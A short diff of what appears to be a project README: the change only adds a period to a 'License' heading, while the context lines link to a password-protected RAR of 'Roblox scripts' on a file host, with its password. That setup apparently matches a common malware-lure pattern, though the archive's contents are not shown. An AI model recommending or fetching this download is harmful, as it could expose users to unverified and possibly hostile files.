@@ -32,7 +32,7 @@ Additional resources can be downloaded here:
 External archive:
 https://www.mediafire.com/file/vzqpyfncmpwym22/Roblox_scripts_.rar/file   password 2026
 
-License
+License.
 
 This project is distributed under the MIT License. Usage is permitted within the terms of this license.
 
